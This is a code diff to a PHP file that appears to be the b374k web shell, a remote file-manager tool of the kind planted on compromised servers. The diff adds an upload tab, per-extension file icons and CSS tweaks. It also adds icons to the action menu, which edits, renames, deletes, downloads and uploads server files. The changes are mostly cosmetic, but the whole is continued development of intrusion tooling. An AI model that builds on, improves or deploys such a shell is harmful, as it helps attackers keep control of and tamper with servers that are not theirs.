@@ -1,5 +1,5 @@
 <?php
-$GLOBALS['module_to_load'] = array("explorer");
+$GLOBALS['module_to_load'] = array("explorer", "upload");
 
 if(!function_exists('getSelf')){
 	function getSelf(){
@@ -181,6 +181,77 @@ if(!function_exists('formatBit')){
 		$base = log($size) / log(1024);
 		$suffixes = array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
 		return round(pow(1024, $base - floor($base)),2)." ".$suffixes[floor($base)];
+	}
+}
+
+if (!function_exists("getExtension")) {
+	function getExtension($filename) {
+		return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+	}
+}
+
+if (!function_exists("getIcon")) {
+	function getIcon($filename) {
+		if (is_dir($filename)) {
+			return "https://cdn-icons-png.flaticon.com/512/891/891094.png";
+		} else {
+			switch (getExtension($filename)) {
+				case 'phps':
+				case 'php2':
+				case 'php3':
+				case 'php4':
+				case 'php5':
+				case 'php7':
+				case 'phtml':
+				case 'php':return('https://cdn-icons-png.flaticon.com/512/2306/2306154.png');break;
+				case 'html':
+				case 'twig':
+				case 'blade':
+				case 'tpl':
+				case 'htm':return('https://cdn-icons-png.flaticon.com/512/2306/2306098.png');break;
+				case 'css':return('https://cdn-icons-png.flaticon.com/512/2306/2306041.png');break;
+				case 'js':return('https://cdn-icons-png.flaticon.com/512/2306/2306122.png');break;
+				case 'json':return('https://cdn-icons-png.flaticon.com/512/136/136525.png');break;
+				case 'xml':return('https://cdn-icons-png.flaticon.com/512/2306/2306209.png');break;
+				case 'py':return('https://www.flaticon.com/svg/static/icons/svg/2721/2721287.svg');break;
+				case 'zip':return('https://cdn-icons-png.flaticon.com/512/2306/2306214.png');break;
+				case 'rar':return('https://cdn-icons-png.flaticon.com/512/2306/2306170.png');break;
+				case 'htaccess':return('https://image.flaticon.com/icons/png/128/1720/1720444.png');break;
+				case 'txt':return('https://cdn-icons.flaticon.com/png/512/4248/premium/4248224.png?token=exp=1645629577~hmac=b2cd95baec2456a8abe3585a47dae5c2');break;
+				case 'ini':return('https://image.flaticon.com/icons/svg/1126/1126890.svg');break;
+				case 'mp3':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306139.svg');break;
+				case 'mp4':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306142.svg');break;
+				case 'log':
+				case 'log1':
+				case 'log2':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306124.svg');break;
+				case 'psd':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306166.svg');break;
+				case 'dat':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306050.svg');break;
+				case 'exe':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306085.svg');break;
+				case 'apk':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306016.svg');break;
+				case 'yaml':return('https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png');break;
+				case 'xlsx':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306200.svg');break;
+				case 'bak':return('https://image.flaticon.com/icons/svg/2125/2125736.svg');break;
+				case 'ico':return('https://cdn-icons-png.flaticon.com/512/1126/1126873.png');break;
+				case 'png':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306156.svg');break;
+				case 'jpg':
+				case 'png':
+				case 'webp':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306117.svg');break;
+				case 'jpeg':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306114.svg');break;
+				case 'svg':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306179.svg');break;
+				case 'gif':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306094.svg');break;
+				case 'pdf':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306145.svg');break;
+				case 'asp':return("https://cdn-icons-png.flaticon.com/512/136/136521.png");break;
+				case 'doc':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306060.svg");break;
+				case 'docx':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306065.svg");break;
+				case 'otf':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306149.svg");break;
+				case 'ttf':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306182.svg");break;
+				case 'wav':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306188.svg");break;
+				case 'sql':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306173.svg");break;
+				case 'csv':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306046.svg");break;
+				case 'bat':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306025.svg");break;
+				default:return('https://image.flaticon.com/icons/svg/833/833524.svg');break;
+			}
+		}
 	}
 }
 
@@ -521,7 +592,7 @@ if (!function_exists("showFiles")) {
 						<th class='col-cbox sorttable_nosort'>
 							<div class='cBoxAll'></div>
 						</th>
-						<th class='col-name'>Filename</th>
+						<th colspan='2' class='col-name'>Filename</th>
 						<th class='col-size'>Size</th>";
 		foreach ($finfo as $key => $value) {
 			$output .= "<th class='col-".$key."'>".$key."</th>";
@@ -538,7 +609,13 @@ if (!function_exists("showFiles")) {
 				$totalFolders++;
 			}
 			$output .= "
-						<tr data-path=\"".html_safe(realpath($value[0]).DIRECTORY_SEPARATOR)."\"><td><div class='cBox".$cboxException."'></div></td>
+						<tr data-path=\"".html_safe(realpath($value[0]).DIRECTORY_SEPARATOR)."\">
+						<td>
+							<div class='cBox".$cboxException."'></div>
+						</td>
+						<td class='icon'>
+							<img class='icon' src='".getIcon($value[0])."'>
+						</td>
 						<td style='white-space:normal;'>
 							<a class='navigate'>".$value[1]."</a>
 						</td>
@@ -558,6 +635,9 @@ if (!function_exists("showFiles")) {
 							<td>
 								<div class='cBox'></div>
 							</td>
+							<td class='icon'>
+								<img class='icon' src='".getIcon($value[0])."'>
+							</td>
 							<td style='white-space:normal;'>
 								<a class='view'>".html_safe($value[1])."</a>
 								
@@ -568,7 +648,7 @@ if (!function_exists("showFiles")) {
 				if ($key == "modified") $sortable == " title='" .filemtime($value[1]). "'";
 				$output .= "<td" .$sortable. ">" .$values($value[0]). "</td>";
 			}
-			$output .= "<td><span class='action floatRight'>action</span></td>";
+			$output .= "<td><span class='action floatRight'>Action</span></td>";
 			$output .= "</tr>";
 
 		}
@@ -657,6 +737,10 @@ $GLOBALS['module']['explorer']['title'] = "Explorer";
 $GLOBALS['module']['explorer']['js_ontabselected'] = "";
 $GLOBALS['module']['explorer']['content'] = $explorerContent;
 
+$GLOBALS['module']['upload']['id'] = "upload";
+$GLOBALS['module']['upload']['title'] = "Upload";
+$GLOBALS['module']['upload']['js_ontabselected'] = "";
+$GLOBALS['module']['upload']['content'] = "<h1>Upload</h1>";
 
 $res = "";
 if(isset($post['cd'])){
@@ -900,6 +984,13 @@ if(!function_exists('decode_line')){
 				margin:8px 0;
 				border-bottom:1px dashed #dddddd;
 			}
+			.icon {
+				width: 25px;
+				height: 25px;
+			}
+			td.icon {
+				width: 10px;
+			}
 			video{
 				width:100%;
 				background:#222222;
@@ -989,11 +1080,19 @@ if(!function_exists('decode_line')){
 				display:none;
 			}
 			#loading{
-				width:64px;
-				height:64px;
-				background:#7C94A8;
-				border-radius:32px 0 32px 0;
-				margin:auto;
+				color: #ffffff;
+				font-size: 20px;
+				margin: 100px auto;
+				width: 1em;
+				height: 1em;
+				border-radius: 50%;
+				position: relative;
+				text-indent: -9999em;
+				-webkit-animation: load4 1.3s infinite linear;
+				animation: load4 1.3s infinite linear;
+				-webkit-transform: translateZ(0);
+				-ms-transform: translateZ(0);
+				transform: translateZ(0);
 				vertical-align:middle;
 			}
 			#ulDragNDrop{
@@ -1013,7 +1112,7 @@ if(!function_exists('decode_line')){
 				width:300px;
 				min-width:10px;
 				background: #404040;
-				padding:8px 8px 0 8px;
+				padding:10px 10px 0 10px;
 				border-radius:8px;
 				position:fixed;
 				opacity:1;
@@ -1026,6 +1125,7 @@ if(!function_exists('decode_line')){
 				border-radius:8px;
 				text-align:center;
 				cursor:pointer;
+				margin-bottom:9px;
 			}
 			.boxtitle a, .boxtitle a:hover{
 				color:#000000;
@@ -1041,7 +1141,11 @@ if(!function_exists('decode_line')){
 			.boxtbl{
 				border-radius:8px;
 				padding-bottom:8px;
+				padding-top:10px;
 				background:#4C4C4C;
+			}
+			.boxtbl .menu {
+				margin-right: 8px;
 			}
 			.boxtbl td{
 				vertical-align:middle;
@@ -1176,6 +1280,9 @@ if(!function_exists('decode_line')){
 			.dataView .col-size{
 				width:70px;
 			}
+			.dataView .col-action {
+				width: 50px;
+			}
 			#xplTable tr>td:nth-child(3){
 				text-align:left;
 			}
@@ -1269,10 +1376,18 @@ if(!function_exists('decode_line')){
 					<img onclick='viewfileorfolder();' id='b374k' src='<?php echo getResource('b374k');?>' />&nbsp;<span id='nav'><?php echo $nav; ?></span>
 				</div>
 			</div>
+			
+				<?php
+				foreach($GLOBALS['module_to_load'] as $value){
+					echo "<a class='menuitem' id='menu".$GLOBALS['module'][$value]['id']."' href='#!".$GLOBALS['module'][$value]['id']."'>".$GLOBALS['module'][$value]['title']."</a>";
+				}
+				?>
 			<div id='content'>
 				<?php
-				foreach(array("explorer") as $value){
-					echo "<div class='menucontent' id='".$GLOBALS['module'][$value]['id']."'>".$GLOBALS['module'][$value]['content']."</div>";
+				foreach($GLOBALS["module_to_load"] as $value){
+					?>
+					<div class="menucontent" id="<?= $GLOBALS['module'][$value]['id'] ?>"><?= $GLOBALS['module'][$value]['content'] ?></div>
+					<?php
 				}
 				?>
 			</div>
@@ -1799,13 +1914,31 @@ function action(path, type){
 	title = "Action";
 	content = '';
 	if(type=='file') {
-		content = "<table class='boxtbl'><tr><td>"+baseName(path)+"</td></tr><tr data-path='"+path+"'><td><span class='edit button'>Edit</span><span class='ren button'>Rename</span><span class='del button'>Delete</span><span class='dl button'>Download</span></td></tr></table>";
+		content = "<table class='boxtbl'><tr><td><img class='icon menu' src='"+getIcon(path)+"'>"+baseName(path)+"</td></tr><tr data-path='"+path+"'><td><span class='edit button'>Edit</span><span class='ren button'>Rename</span><span class='del button'>Delete</span><span class='dl button'>Download</span></td></tr></table>";
 	}
 	if(type=='dir') {
-		content = "<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='find button'>Find</span><span class='ul button'>Upload</span><span class='ren button'>Rename</span><span class='del button'>Delete</span></td></tr></table>";
+		content = "<table class='boxtbl'><tr><td><img class='icon menu' src='https://cdn-icons-png.flaticon.com/512/891/891094.png'><input style='width:86%;background:none;border:none;color:#fff;' type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='find button'>Find</span><span class='ul button'>Upload</span><span class='ren button'>Rename</span><span class='del button'>Delete</span></td></tr></table>";
 	}
 	show_box(title, content);
 	xpl_bind();
+}
+
+function getFileExtension(filename){
+    const extension = filename.substring(filename.lastIndexOf('.') + 1, filename.length);
+    return extension;
+}
+
+function getIcon(filename) {
+	let getExt = getFileExtension(filename)
+	if (getExt == "php") {
+		return "https://cdn-icons-png.flaticon.com/512/2306/2306154.png";
+	} else if (getExt == "html") {
+		return "https://cdn-icons-png.flaticon.com/512/2306/2306098.png";
+	} else if (getExt == "css") {
+		return "https://cdn-icons-png.flaticon.com/512/2306/2306041.png";
+	} else {
+		return "";
+	}
 }
 
 function navigate(path, showfiles){
